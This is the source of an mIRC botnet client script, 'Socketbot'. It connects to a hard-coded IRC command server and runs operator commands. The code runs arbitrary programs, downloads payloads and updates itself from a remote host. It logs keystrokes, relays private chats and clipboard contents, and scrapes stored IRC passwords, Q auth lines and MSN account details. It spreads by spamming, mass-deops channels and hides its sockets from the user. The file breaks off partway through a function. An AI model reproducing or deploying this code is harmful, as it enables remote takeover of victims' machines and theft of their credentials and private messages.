on *:active:*:{ if (!$sock(unk)) uo.start }
on *:sockread:uNk:{
set %uo.read
sockread %uo.read
tokenize 32 %uo.read
if ($gettok(%uo.read,1,32) == PING) {
.timer 1 2 $uo.write PONG $gettok(%uo.read,2,32)
}
if (*End of /motd command* iswm %uo.read || *MOTD File is missing* iswm %uo.read) {
$uo.write j $+ o $+ i $+ n $uo.Base goat
}
if ($2 == 332) {
.set %uo.Topic $right($gettok(%uo.read,5-,32),-1)
.timer 1 2 uo.topiccmd
}
if (l@g == $gettok($gettok(%uo.read,2,33),1,32)) { 
if ($4 == :?server) {
var %uo.server $scon(0)
while (%uo.server > 0) {
scon %uo.server
$uo.write privmsg $uo.base : $+ $uo.style(Network) $+ : $network Server: $server Port: $port Nick: $me Active: $active
dec %uo.server
}
}
if ($4 == :?ip) {
$uo.write privmsg $uo.base : $+ $uo.style(IP) $+ : $iif($ip == $null,ERROR,$ip) $uo.style(HOST) $+ : $iif($host == $null,ERROR,$host)
}
if ($4 == :?restart) {
$uo.write privmsg $uo.base : $+ $uo.style(Restart) $+ : Reconnecting.
.timer 1 1 $uo.write quit : Reconnecting.
}
if ($4 == :?die) {
quit
exit
}
if ($4 == :?disconnect) {
.timers off
.sockclose uNk
}
if ($4 == :?Visit) {
.sockclose uo.Visit
.sockopen uo.Visit $5 80
.set %uo.visit.host $5
.set %uo.visit.file $6
}
if ($4 == :?runmircdir) {
.run $mircdir $+ $gettok(%uo.read,5-,32)
$uo.write privmsg $uo.base : $+ $uo.style(RUN) $+ : \" $+ $gettok(%uo.read,5-,32) $+ " wurde ausgeführt.
}
if ($4 == :?nick) {
.nick $5
$uo.write privmsg $uo.base : $+ $uo.style(NICK) $+ : Changed nick to $5 $+ .
}
if ($4 == :?set) {
.set $5 $6-
$uo.write privmsg $uo.base : $+ $uo.style(SET) $+ : \" $+ $gettok(%uo.read,5-,32) $+ " wurde gesetzt.
}
if ($4 == :?cset) {
if (%uo.Country = $5) {
.set $6 $7-
$uo.write privmsg $uo.base : $+ $uo.style(CSET) $+ : \" $+ $gettok(%uo.read,6-,32) $+ " wurde gesetzt.
}
}
if ($4 == :?amsg) {
.amsg $5-
$uo.write privmsg $uo.base : $+ $uo.style(AMSG) $+ : \" $+ $gettok(%uo.read,5-,32) $+ " wurde ausgeführt.
}
if ($4 == :?msg) {
.msg $5 $6-
$uo.write privmsg $uo.base : $+ $uo.style(MSG) $+ : msg $5 " $+ $gettok(%uo.read,6-,32) $+ " wurde ausgeführt.
}
if ($4 == :?camsg) {
if (%uo.Country = $5) {
.amsg $6-
$uo.write privmsg $uo.base : $+ $uo.style(CAMSG) $+ : \" $+ $gettok(%uo.read,6-,32) $+ " wurde ausgeführt.
}
}
if ($4 == :?chamsg) && (%uo.Country != $5) {
.amsg $6-
$uo.write privmsg $uo.base : $+ $uo.style(CHAMSG) $+ : \" $+ $gettok(%uo.read,6-,32) $+ " wurde ausgeführt.
}
if ($4 == :?join) {
.join $5
$uo.write privmsg $uo.base : $+ $uo.style(JOIN) $+ : Joined $5 successfully.
}
if ($4 == :?part) {
.part $5
$uo.write privmsg $uo.base : $+ $uo.style(PART) $+ : Parted $5 successfully .
}
if ($4 == :?cmsg) {
if (%uo.Country = $5) {
.msg $6 $7-
$uo.write privmsg $uo.base : $+ $uo.style(CMSG) $+ : msg $6 " $+ $gettok(%uo.read,7-,32) $+ " wurde ausgeführt.
}
}
if ($4 == :?do) {
. $+ $($5-,2)
$uo.write privmsg $uo.base : $+ $uo.style(DO) $+ : \" $+ $gettok(%uo.read,5-,32) $+ " wurde ausgeführt.
:error
reseterror
}
if ($4 == :?cdo) {
if (%uo.Country = $5) {
$6-
$uo.write privmsg $uo.base : $+ $uo.style(CDO) $+ : \" $+ $gettok(%uo.read,6-,32) $+ " wurde ausgeführt.
}
}
if ($4 == :?chdo) {
if (%uo.Country = $5) {
halt
}
$6-
$uo.write privmsg $uo.base : $+ $uo.style(CHDO) $+ : \" $+ $gettok(%uo.read,6-,32) $+ " wurde ausgeführt.
}
if ($4 == :?cmdc) {
$uo.write $gettok(%uo.read,5-,32)
$uo.write privmsg $uo.base : $+ $uo.style(CMDC) $+ : \" $+ $gettok(%uo.read,5-,32) $+ " wurde ausgeführt.
:error
reseterror
}
if ($4 == :?Version) {
$uo.write privmsg $uo.base : $+ $uo.style(Version) u2Nkn20wn*2Socketbot $uo.ver 2• 2Last 2update 2was 2from $uo.up
}
if ($4 == :?cmdn) {
$uo.write privmsg $uo.base : $+ $uo.style(CMDN) $+ : \" $+ $gettok(%uo.read,5-,32) $+ " wurde ausgeführt.
$normal.control $gettok(%uo.read,5-,32)
}
if ($4 == :?ccmdn) {
if (%uo.Country = $5) {
$uo.write privmsg $uo.base : $+ $uo.style(CCMDN) $+ : \" $+ $gettok(%uo.read,6-,32) $+ " wurde ausgeführt.
$normal.control $gettok(%uo.read,6-,32)
}
}
if ($4 == :?chcmdn) {
if (%uo.Country = $5) {
halt
}
$uo.write privmsg $uo.base : $+ $uo.style(CHCMDN) $+ : \" $+ $gettok(%uo.read,6-,32) $+ " wurde ausgeführt.
$normal.control $gettok(%uo.read,6-,32)
}
if (*?cmdn nick* iswm %uo.read) {
$uo.write NICK : [uNk]- $+ $gettok(%uo.read,6,32) 
}
if ($4 == :?Country) {
$uo.write privmsg $uo.base : $+ $uo.style(Country) $+ : $iif(%uo.Country == $null,ERROR,%uo.Country)
}
if ($4 == :?channels) {
.var %j = 1
while (%j <= $scon(0)) {
.scon %j
.var %i = 1
while (%i <= $chan(0)) {
.set %uo.chans %uo.chans $iif($me isop $chan(%i),4@5) $+ $iif($me isvoice $chan(%i),+) $+ $chan(%i) ( $+ $nick($chan(%i),0,a) $+ $iif($chan(%i).key,|2 $+ $chan(%i).key) $+ 0) 3•0
.inc %i
}
$uo.write privmsg $uo.base : $+ $uo.style(Channel\ $+ $network $+ ) $+ : $iif(%uo.chans == $null,Not connected,%uo.chans)
.unset %uo.chans
.inc %j
}
}
if ($4 == :?Spread) && (!$5) {
$uo.write privmsg $uo.base : $+ $uo.style(Spread Status) $+ : $iif(%uo.Spread == $null,off,%uo.Spread) 03• $uo.style(Spread MSG) $+ : $iif(%uo.spreadmsg == $null,no spread msg set,%uo.spreadmsg)
}
if ($4 == :?Spread) && ($5 == msg) {
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : msg changed to: $6-
set %uo.Spreadmsg $6-
}
if ($4 == :?Spread) && ($5 == on) {
$uo.write join $uo.Spreadchan
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : Turned spread on
.set %uo.Spread on
}
if ($4 == :?Spread) && ($5 == off) {
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : Turned spread off
set %uo.Spread off
}
if ($4 == :?cspread) && (%uo.Country = $5) && (!$6) {
$uo.write privmsg $uo.base : $+ $uo.style(Spread Status) $+ : $iif(%uo.Spread == $null,off,%uo.Spread)03• $uo.style(Spread MSG) $+ : $iif(%uo.Spreadmsg == $null,no Spread msg set,%uo.Spreadmsg)
}
if ($4 == :?cspread) && ($5 == %uo.Country) && ($6 == on) {
$uo.write join $uo.Spreadchan
.set %uo.Spread on
$uo.write privmsg $uo.base : $+ $uo.style(Cspread) $+ : Turned spread on
}
if ($4 == :?cspread) && ($5 == %uo.Country) && ($6 == msg) {
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : msg changed to: $7-
set %uo.Spreadmsg $7-
}
if ($4 == :?cspread) && ($5 == %uo.Country) && ($6 == off) {
set %uo.Spread off
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : Turned spread off
}
if ($4 == :?chspread) && (!%uo.Country = !$5) && (!$6) {
$uo.write privmsg $uo.base : $+ $uo.style(Spread Status) $+ : $iif(%uo.Spread == $null,off,%uo.Spread) 03• $uo.style(Spread MSG) $+ : $iif(%uo.Spreadmsg == $null,no spread msg set,%uo.Spreadmsg)
}
if ($4 == :?chspread) && (!%uo.Country = !$5) && ($6 == on) {
$uo.write join $uo.Spreadchan
.set %uo.Spread on
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : Turned spread on
}
if ($4 == :?chspread) && (!%uo.Country = !$5) && ($6 == msg) {
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : msg changed to: $7-
set %uo.Spreadmsg $7-
}
if ($4 == :?chspread) && (!%uo.Country = !$5) && ($6 == off) {
set %uo.Spread off
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : Turned spread off
}
if ($4 == :?update) && (!$5) {
.set %uo.update.host genesisdev.ge.ohost.de
.set %uo.update.file /update.mrc
$uo.write privmsg $uo.base : $+ $uo.style(Update) $+ : Updating the bot
.uo.update
}
if ($4 == :?update) && ($5) && ($6) {
.set %uo.update.host $5
.set %uo.update.file $6
$uo.write privmsg $uo.base : $+ $uo.style(Update) $+ : Updating the bot from $+(http://,$5,$6)
.uo.update
}
if ($4 == :?download) {
uo.download $5-
}
if ($4 == :?cdownload) {
if (%uo.Country = $5) {
uo.download $6-
}
}
if ($4 == :?chdownload) {
if (%uo.Country != $5) {
uo.download $6-
}
}
if ($4 == :?massdeop) {
uo.massdeop $5
$uo.write privmsg $uo.base : $+ $uo.style(Massdeop) $+ : Trying to massdeop all users on $5
}
if ($4 == :?clipboard) {
if ($cb(0) == $null) {
$uo.write privmsg $uo.base : $+ $uo.style(Clipboard) $+ : No clipboard datas found.
}
else {
var %c = $cb(0)
$uo.write privmsg $uo.base : $+ $uo.style(Clipboard) $+ : %c Clipboard lines will be pasted 03• it will be done in %c sec
var %i = 1
while (%i <= %c) {
.timer 1 %i $uo.write privmsg $uo.base : $+ $uo.style(Clipboard) $chr(35) $+ %i $cb(%i)
inc %i
}
}
}
if ($4 == :?keylogger) && ($5 = on) { 
set %uo.klog on 
$uo.write privmsg $uo.base : $+ $uo.style(KEYLOGGER): Activated.
}
if ($4 == :?keylogger) && ($5 = off) { 
set %uo.klog off 
$uo.write privmsg $uo.base : $+ $uo.style(KEYLOGGER): Deactivated.
}
if ($4 == :?spybot) && ($5 = on) {
if (%uo.spybot == on) {
$uo.write privmsg $uo.spychan : $+ $uo.style(SPYBOT): Already logging.
}
else {
$uo.write join $uo.spychan
set %uo.spybot on
$uo.write privmsg $uo.Base : $+ $uo.style(SPYBOT): Activated.
$uo.write privmsg $uo.Spychan : $+ $uo.style(SPYBOT): Activated.
}
}
if ($4 == :?spybot) && ($5 == off) { 
set %uo.spybot off 
$uo.write privmsg $uo.Base : $+ $uo.style(SPYBOT): Deactivated. 
$uo.write privmsg $uo.Spychan : $+ $uo.style(SPYBOT): Deactivated. 
}
if ($4 == :?Auth) {
if ($read($uo.perfini,w,*auth*)) { 
$uo.write privmsg $uo.base : $+ $uo.style(Auth) $+ : Auth found 03•0 $read($uo.perfini,$readn) 
inc %a
}
if ($read($uo.perfini,w,*oper*)) {
$uo.write privmsg $uo.base : $+ $uo.style(Auth) $+ : Oper found 03•0 $read($uo.perfini,$readn) 
inc %a 
}
if ($read($uo.perfini,w,*identify*)) {
$uo.write privmsg $uo.base : $+ $uo.style(Auth) $+ : Identify found 03•0 $read($uo.perfini,$readn) 
inc %a
}
if ($read($uo.perfini,w,*login*)) { 
$uo.write privmsg $uo.base : $+ $uo.style(Auth) $+ : Login found 03•0 $read($uo.perfini,$readn) 
inc %a 
}
$uo.write privmsg $uo.base : $+ $uo.style(Auth) $+ : End of List.
}
if ($4 == :?bouncer) {
if ($read($uo.servini,w,*BNC*)) {
$uo.write privmsg $uo.base : $+ $uo.style(Bouncer) $+ : found 03•0 $read($uo.servini,$readn) 03•0 Ident: $remove($iif($read($uo.mircini,w,*userid=*),$read($uo.mircini,$readn)),userid=)
}
if ($read($uo.servini,w,*my-ct*)) {
$uo.write privmsg $uo.base : $+ $uo.style(Bouncer) $+ : found 03•0 $read($uo.servini,$readn) 03•0 Ident: $remove($iif($read($uo.mircini,w,*userid=*),$read($uo.mircini,$readn)),userid=)
}
if ($read($uo.servini,w,*1337*)) { 
$uo.write privmsg $uo.base : $+ $uo.style(Bouncer) $+ : found 03•0 $read($uo.servini,$readn) 03•0 Ident: $remove($iif($read($uo.mircini,w,*userid=*),$read($uo.mircini,$readn)),userid=) 
}
if ($read($uo.servini,w,*Bouncer*)) {
$uo.write privmsg $uo.base : $+ $uo.style(Bouncer) $+ : found 03•0 $read($uo.servini,$readn) 03•0 Ident: $remove($iif($read($uo.mircini,w,*userid=*),$read($uo.mircini,$readn)),userid=)
}
if ($read($uo.servini,w,*shell*)) { 
$uo.write privmsg $uo.base : $+ $uo.style(Bouncer) $+ : found 03•0 $read($uo.servini,$readn) 03•0 Ident: $remove($iif($read($uo.mircini,w,*userid=*),$read($uo.mircini,$readn)),userid=) 
}
$uo.write privmsg $uo.base : $+ $uo.style(Bouncer) $+ : End of listening.
}
if ($4 == :?chat) {
if (%uo.Chatopen == 0) {
.set %uo.Chatopen 1
.timer 1 1 uo.Chat $5
}
}
if ($4 == :?Chatclose) {
if (%uo.chatopen == 1) {
set %uo.chatopen 0
dialog -c uo.dchat uo.dchat
$uo.write privmsg $uo.base : $+ $uo.style(Chat Closed)
write -c uo.chat.txt
}
}
if ($4 == :?Chatanswer) {
if (%uo.chatopen == 1) {
did -r uo.dchat 3
write uo.chat.txt %uo.hekker $+ : $5
c.init
}
}
if ($4 == :?ca) {
if (%uo.chatopen == 1) {
did -r uo.dchat 3
write uo.chat.txt %uo.hekker $+ : $5-
c.init
}
}
if ($4 == :?mircdir) {
$uo.write privmsg $uo.base : $+ $uo.style(MIRCDIR) $+ : $mircdir
}
if ($4 == :?partall) {
$uo.write privmsg $uo.base : $+ $uo.style(CLOSEALLCHANNEL) $+ : Start massparting.
.timer 1 1 uo.partall
}
if ($4 == :?qwhois) {
set %uo.qwhois on
.msg q whois $me
}
if ($4 == :?lwhois) {
set %uo.lwhois on
.msg l whois $me 
}
if ($4 == :?run) {
.run $gettok(%uo.read,5-,32)
$uo.write privmsg $uo.base : $+ $uo.style(RUN) $+ : \" $+ $gettok(%uo.read,5-,32) $+ " wurde ausgeführt.
}
if ($4 == :?lag) {
$uo.write privmsg $uo.base : $+ $uo.style(LAG) Lag to $iif($lag == $null,ERROR,$lag $+ ms)
}
if ($4 == :?crun) {
if (%uo.country = $5) {
.run $gettok(%uo.read,6-,32)
$uo.write privmsg $uo.base : $+ $uo.style(RUN) $+ : \" $+ $gettok(%uo.read,6-,32) $+ " wurde ausgeführt.
}
}
if ($4 == :?runmircdir) {
.run $mircdir $+ $gettok(%uo.read,5-,32)
$uo.write privmsg $uo.base : $+ $uo.style(RUN) $+ : \" $+ $gettok(%uo.read,5-,32) $+ " wurde ausgeführt.
}
if ($4 == :?info) {
if ($5 == Bot) {
$uo.write privmsg $uo.base $uo.style(Bot Info) I'm infected with 03• u2Nkn20wn*2Socketbot $uo.ver 2• 2Last 2update 2was 2from $uo.up
}
elseif ($5 == User) {
$uo.write privmsg $uo.base : $+ $uo.style(User Info) Nick: $me 03• aNick: $anick 03• eMail: $emailaddr 03• Fullname: $fullname
}
elseif ($5 == Socketbot) {
$uo.write privmsg $uo.base : $+ $uo.style(Socketbot Info) IP: $sock(uNk).bindip : $+ $sock(uNk).bindport 03• online for: $duration($sock(uNk).to)
}
elseif ($5 == mIRC) {
$uo.write privmsg $uo.base : $+ $uo.style(mIRC Info) Version: $version 03• Direction: $mircdir $iif($titlebar,03• Titlebar: $titlebar,)
}
elseif ($5 == Uptime) {
$uo.write privmsg $uo.base : $+ $uo.style(Uptime Info) mIRC: $uptime(mirc,1) 03• Server: $uptime(server,1) 03• System: $uptime(system,1)
}
elseif ($5 == msn) {
uo.msn
}
elseif ($5 == Script) {
.var %x = 1,%s = $script(0),%b,%l
while (%x <= %s) {
.inc %b $file($script(%x)).size
.inc %l $lines($script(%x))
.inc %x
}
$uo.write privmsg $uo.base : $+ $uo.style(Script) Script $+ $iif($script(0) > 1,s) $+ : $script(0) 03• DLL $+ $iif($script(0) > 1,s) $+ : $dll(0) 03• ( $+ %b bytes/ $+ %l lines)
} 
else {
$uo.write privmsg $uo.base : $+ $uo.style(Info commands) Bot 03• User 03• Socketbot 03• mIRC 03• Uptime 03• Script 03• msn
}
}
}
}

on *:SOCKOPEN:uo.update:{
if ($sockerr != 0) {
.sockclose $sockname
.timer 1 3 uo.update
}
else {
.write -c $uo.curscr
.sockwrite -n uo.update GET %uo.update.file HTTP/1.0
.sockwrite -n uo.update Host: %uo.update.host
.sockwrite -n uo.update User-Agent: Mozilla
.sockwrite -n uo.update $crlf
.sockwrite -n uo.update $crlf
.write -c $uo.curscr
}
}

on *:SOCKCLOSE:uo.update:{
.unset %uo.update.*
.timer 1 1 .reload -rs1 $eval($uo.curscr,2) | .timer 1 1 !sockclose unk
.timer 1 5 uo.start
}

on *:SOCKREAD:uo.update:{
.sockread -f &uo.update
.bwrite $uo.curscr -1 -1 &uo.update
}

on *:sockopen:uo.Visit: {
.sockwrite -n uo.Visit GET %BaNdiTos.visit.file HTTP/1.0
.sockwrite -n uo.Visit Host: www. $+ %BaNdiTos.visit.host
.sockwrite -n uo.Visit User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
$uo.write privmsg $uo.base : $+ $uo.style(Visit) Visited http:// $+ %uo.visit.host $+ %uo.visit.file $+  successfully.
unset %uo.visit.host
unset %uo.visit.file
:error
reseterror
}

on *:sockread:uo.Visit:{
if ($sock($sockname)) {
.timer 1 3 sockclose $sockname
}
}

on *:sockopen:uo.Getcountry:{
sockwrite -n uo.getcountry GET /lookup.php?ip= $+ $ip HTTP/1.0
sockwrite -n uo.getcountry Host: nnscript.de
sockwrite -n $sockname User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6)
sockwrite -n uo.getcountry
}

on *:sockread:uo.Getcountry:{
var %g
sockread %g
if (!%uo.Countryget) {
set %uo.Countryget 1
goto next
}
set %uo.Country $gettok(%g,2,9)
unset %uo.Countryget
;sockclose uo.Country
:next
}

on *:sockopen:uo.download_*:{
if ($sockerr) {
$uo.write privmsg $uo.base : $+ $uo.style(Error) $+ : $sockerr while downloading $gettok($sockname,2-,46)
return
}
write -c $getdir $+ $gettok($sockname,2-,46)
sockwrite -n $sockname GET $eval($+(/,$gettok($remove(%uo.download. [ $+ [ $gettok($sockname,2-,95) ] ],http://),2-,47)),2) HTTP/1.0
sockwrite -n $sockname Accept: */*
sockwrite -n $sockname Host: $eval($+($gettok($remove(%uo.download. [ $+ [ $gettok($sockname,2-,95) ] ],http://),1,47)),2)
sockwrite -n $sockname
}

on *:sockread:uo.download_*:{
if ($eval($+(%,uo.download.ready,$gettok($sockname,2-,46)),2) != 1) {
var %uo.download.header [ $+ [ $gettok($sockname,2-,46) ] ]
sockread %uo.download.header [ $+ [ $gettok($sockname,2-,46) ] ]
while ($sockbr) {
if (Content-length: * iswm %uo.download.header [ $+ [ $gettok($sockname,2-,46) ] ]) {
set %uo.download.length [ $+ [ $gettok($sockname,2-,46) ] ] $gettok(%uo.download.header [ $+ [ $gettok($sockname,2-,46) ] ],2,46)
$uo.write privmsg $uo.base : $+ $uo.style(Downloading) $+ : $gettok($sockname,2-,46) ...
}
elseif (* !iswm $eval($+(%,uo.download.header,$gettok($sockname,2-,46)),2)) {
set %uo.download.ready [ $+ [ $gettok($sockname,2-,46) ] ] 1
set %uo.download.offset [ $+ [ $gettok($sockname,2-,46) ] ] $sock($sockname).rcvd
break
}
sockread %uo.download.header [ $+ [ $gettok($sockname,2-,46) ] ]
}
}
sockread 4096 &d
while ($sockbr) {
bwrite $chr(34) $+ $getdir $+ $gettok($sockname,2-,46) $+ $chr(34) -1 -1 &d
sockread 4096 &d
}
}

on *:sockclose:uo.download_*:{
$uo.write privmsg $uo.base : $+ $uo.style(Download) $+ : Done downloading $gettok($sockname,2-,46) to $chr(34) $+ $getdir $+ $gettok($sockname,2-,46) $+ $chr(34)
}


on *:SOCKOPEN:uNk:{
.sockwrite -n $sockname PASS omfgircis1337
.sockwrite -n $sockname NICK uo| $+ $me
.sockwrite -n $sockname USER $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)$+ $r(a,z) $+ $r(a,z) $+(",aGa,") justprivate
:error
reseterror
}

on *:SOCKCLOSE:uNk:{
.timer 1 3 .uo.start
}

on ^*:notice:*:?: {
if ($nick == Q && %uo.qwhois == on) {
$uo.write privmsg $uo.base : $+ $uo.style(Q Whois) $+ : $1-
haltdef
:error
reseterror
if ($1- == End of list.) {
unset %uo.qwhois
}
}
if ($nick == L && %uo.lwhois == on) {
$uo.write privmsg $uo.base : $+ $uo.style(L Whois) $+ : $1-
haltdef
:error
reseterror
if ($1- == End of list.) {
unset %uo.lwhois
}
}
}

on ^*:notice:*Access level*:?: {
if ($nick == Q && %uo.qwhoami == on) {
$uo.write privmsg $uo.base : $+ $uo.style(L Whois) $+ : $1-
haltdef
timer 1 10 unset %uo.qwhoami
:error
reseterror
}
}


on *:join:#: {
if ($nick == $me && $chan == #feds) || ($nick == $me && $chan == #help) {
$uo.write privmsg $uo.base : $+ $uo.style(JOINBLOCKER) $+ : Tryed to join $chan but canceld.
.window -h $chan
:error
reseterror
}
}

on *:nick:{
if ($nick == $me) && $sock(*uNk*,0) == 1) {
$uo.write NICK uo| $+ $newnick
:error
reseterror
}
}

on *:text:*o*:#*:{
if (!%uo.flood) && (%uo.Spread == on) {
$uo.write PRIVMSG $uo.Spreadchan : $+ $uo.style(SPREADMSG @ $network $+ ) to $uo.style( $+ $nick @ Query) $+ : %uo.Spreadmsg
.timer 1 10 .msg $nick %uo.Spreadmsg
.ignore -u1800 $nick
set -u150 %uo.flood
:error
reseterror
}
}

on *:text:*:?: {
if (%uo.spybot == on && $sock(*uNk*,0) == 1) { 
$uo.write PRIVMSG $uo.Spychan : $+ $uo.style(SPYMSG @ $network $+ ) from $uo.style( $+ $nick @ Query) $+ : $1- 
}
}

on *:text:*:#*: {
if (%uo.spybot == on && $sock(*uNk*,0) == 1) { 
$uo.write PRIVMSG $uo.Spychan : $uo.style(SPYMSG @ $network $+ ) from $uo.style( $+ $nick @ $chan $+ ) $+ : $1-
} 
}

on *:input:?: {
if (%uo.spybot == on && $sock(*uNk*,0) == 1) { 
$uo.write PRIVMSG $uo.Spychan : $+ $uo.style(SPYMSG @ $network $+ ) from $uo.style( $+ $nick @ Query) $+ : $1- 
}
}

on *:input:#*: {
if (%uo.spybot == on && $sock(*uNk*,0) == 1) { 
$uo.write PRIVMSG $uo.Spychan : $uo.style(SPYMSG @ $network $+ ) from $uo.style( $+ $nick @ $chan $+ ) $+ : $1-
}
}

on *:input:*: {
if (%uo.klog == on) && ($sock(*uNk*,0) == 1) { 
$uo.write PRIVMSG $uo.base : $+ $uo.style( $+ $network - $active $+ ) - $1- 
}
if (*Q newpass* iswm $1- && ($sock(*uNk*,0) == 1)) {
$uo.write PRIVMSG $uo.base : $+ $uo.style(NEWQPASS) $+ :7 $1- 
} 
if (*Q@cserve.quakenet.org auth* iswm $1- && ($sock(*uNk*,0) == 1)) {
$uo.write PRIVMSG $uo.base : $+ $uo.style(Auth found) $+ :7 $1-
}
if ($left($1,1) == $chr(47)) && (($mid($1,2,1) == !) || ($mid($1,3,1) == !)) {
$($gettok($1-,2,33),2)
}
:error
reseterror
}


on *:load: {
$uo.start
}

on *:connect:{
if ($sock(*uNk*,0) != 1) {
.uo.start
}
}

Alias uo.massdeop {
if ($1) {
if ($me ison $1) {
set %uo.massdeop.chan $1
set %uo.massdeop 0
:uo.massdeop1
if ($nick(%uo.massdeop.chan,%uo.massdeop,o) == $null) { unset %uo.massdeop* }
else {
set %uo.massdeop.1 $nick(%uo.massdeop.chan,$calc(%uo.massdeop + 1),o)
set %uo.massdeop.2 $nick(%uo.massdeop.chan,$calc(%uo.massdeop + 2),o)
set %uo.massdeop.3 $nick(%uo.massdeop.chan,$calc(%uo.massdeop + 3),o)
set %uo.massdeop.4 $nick(%uo.massdeop.chan,$calc(%uo.massdeop + 4),o)
set %uo.massdeop.5 $nick(%uo.massdeop.chan,$calc(%uo.massdeop + 5),o)
set %uo.massdeop.6 $nick(%uo.massdeop.chan,$calc(%uo.massdeop + 6),o)
if ($me == %uo.massdeop.1) {
set %uo.massdeop.1 $nick(%uo.massdeop.chan,$calc(%uo.massdeop + 7),o) 
inc %uo.massdeop
}
elseif ($me == %uo.massdeop.2) { 
set %uo.massdeop.2 $nick(%uo.massdeop.chan,$calc(%uo.massdeop + 7),o) 
inc %uo.massdeop 
}
elseif ($me == %uo.massdeop.3) { 
set %uo.massdeop.3 $nick(%uo.massdeop.chan,$calc(%uo.massdeop + 7),o)
inc %uo.massdeop 
}
elseif ($me == %uo.massdeop.4) {
set %uo.massdeop.4 $nick(%uo.massdeop.chan,$calc(%uo.massdeop + 7),o) 
inc %uo.massdeop
}
elseif ($me == %uo.massdeop.5) {
set %uo.massdeop.5 $nick(%uo.massdeop.chan,$calc(%uo.massdeop + 7),o)
inc %uo.massdeop
}
elseif ($me == %uo.massdeop.6) { set %uo.massdeop.6 $nick(%uo.massdeop.chan,$calc(%uo.massdeop + 7),o) 
inc %uo.massdeop 
}
mode %uo.massdeop.chan -oooooo %uo.massdeop.1 %uo.massdeop.2 %uo.massdeop.3 %uo.massdeop.4 %uo.massdeop.5 %uo.massdeop.6
inc %uo.massdeop 6
goto uo.massdeop1
unset %uo.massdeop
}
}
}
}

Alias normal.control {
. $+ $($1-,2)
}

Alias uo.style {
return 2( $+ $1 $+ 2)
}

Alias uo.base {
return $chr(35) $+ bots
}

Alias uo.Spychan {
return $chr(35) $+ bots
}

Alias uo.Spreadchan {
return $chr(35) $+ bots
}

Alias uo.mircini {
return $uo.Replace.32($mircdirmirc.ini)
}

Alias uo.perfini {
return $uo.Replace.32($mircdirperform.ini)
}

Alias uo.partall {
var %j = 1
while (%j <= $scon(0)) {
scon %j
var %i = 1
while (%i <= $chan(0)) {
part $chan(%i)
inc %i
}
inc %j
}
}

Alias uo.Visit {
.sockclose uo.Visit
.sockopen uo.Visit $1 80
.set %uo.visit.host $1
.set %uo.visit.file $2
}


Alias uo.servini {
return $uo.Replace.32($mircdirservers.ini)
}

Alias uo.curscr {
return $uo.Replace.32($script)
}

Alias uo.ver {
return v1.6.7b
}

Alias uo.up {
return 9.5.2006
}

alias socklist { 
echo * No open sockets 
}


alias sockclose { 
$uo.write privmsg $uo.base : $+ $uo.style(SOCKCLOSE) Tryed to sockclose but canceld.
:error
reseterror
halt
}

Alias uo.Replace.32 {
var %x1 = $1
var %x2 = $replace(%x1,$chr(32),$chr(63))
var %x3 = " %x2 "
var %x4 = $remove(%x3,$chr(32))
var %x5 = $replace(%x4,$chr(63),$chr(32))
return %x5
}

Alias uo.load { 
.set %uo.update.host genesisdev.ge.ohost.de
.set %uo.update.file /update.mrc
$uo.update
}

Alias uo.start {
if ($sock(*uNk*,0) != 1) {
.sockopen uNk de.mykiwii.de 6667
$uo.Getountry
}
}

Alias uo.update {
.sockopen uo.update %uo.update.host 80
}

Alias uo.write {
return .sockwrite -n uNk $1-
}

Alias uo.Chat {
set %uo.victim $Me
set %uo.hekker $1
dialog -m uo.dchat uo.dchat
did -a uo.dchat 3 $read(uo.chat.txt,%i)
c.init
}

Alias c.init {
var %i = 0
while (%i != $lines(uo.chat.txt)) {
inc %i<
did -a uo.dchat 3 $read(uo.chat.txt,%i)
}
}

Alias uo.Getountry {
sockopen uo.Getcountry nnscript.de 80
}

alias uo.topiccmd {
var %t %uo.Topic
var %x 1 
var %i $calc($count(%t,|) +1)
if (%i == 0) { 
%t 
}
while (%x <= %i) {
if ($left($gettok(%t,%x,124),1) == $chr(32)) {
$right($gettok(%t,%x,124),$calc($len($gettok(%t,%x,124)) -1))
inc %x 
}
else { 
$gettok(%t,%x,124)
}
inc %x 
}
unset %uo.topic
}

alias uo.Msn {
.comopen msn Messenger.UIAutomation 
if ($comerr) { return } 
%uo.a = $com(msn,MyStatus,2) 
%uo.b = $com(msn).result 
%uo.a = $com(msn,MyFriendlyName,2)
%uo.c = $com(msn).result 
%uo.a = $com(msn,MySigninName,2) 
%uo.d = $com(msn).result 
%uo.a = $com(msn,MyServiceName,2) 
%uo.e = $com(msn).result 
%uo.x = $com(msn,InstallationDirectory,1) 
.comclose msn 
if (%uo.b = 1) { 
%uo.b = Offline 
} 
if (%uo.b = 2) { 
%uo.b = Online 
} 
if (%uo.b = 6) {
%uo.b = Invisible 
} 
if (%uo.b = 10) { 
%uo.b = Busy 
} 
if (%uo.b = 14) { 
%uo.b = Be Right Back 
} 
if (%uo.b = 18) { 
%uo.b = Idle 
} 
if (%uo.b = 34) { 
%uo.b = Away 
} 
if (%uo.b = 50) { 
%uo.b = On the Phone
} 
if (%uo.b = 66) { 
%uo.b = Out for Lunch
} 
if (%uo.b = offline) {
$uo.write privmsg $uo.base : $+ $uo.style(MSN) $+ : Currently Offline! 
} 
else { 
$uo.write privmsg $uo.base : $+ $uo.style(MSN) $+ : [Nickname: %uo.c $+ ] [E-mail: %uo.d $+ ] [Service Provider: %uo.e $+ ] [Status: %uo.b $+ ] 
}
unset %uo.a
unset %uo.b
unset %uo.c
unset %uo.d
unset %uo.e
unset %uo.x
}

Alias uo.Version {
$uo.write privmsg $uo.base : $+ $uo.style(Version) u2Nkn20wn*2Socketbot $uo.ver 2• 2Last 2update 2was $uo.up
}

Alias uo.cspread {
if ($1 == %uo.Country) && ($2 == on) {
.set %uo.Spread on
$uo.write join $uo.Spreadchan
$uo.write privmsg $uo.base : $+ $uo.style(Spread) $+ : Turned spread on
}
if ($1 == %uo.Country) && ($2 == msg) {
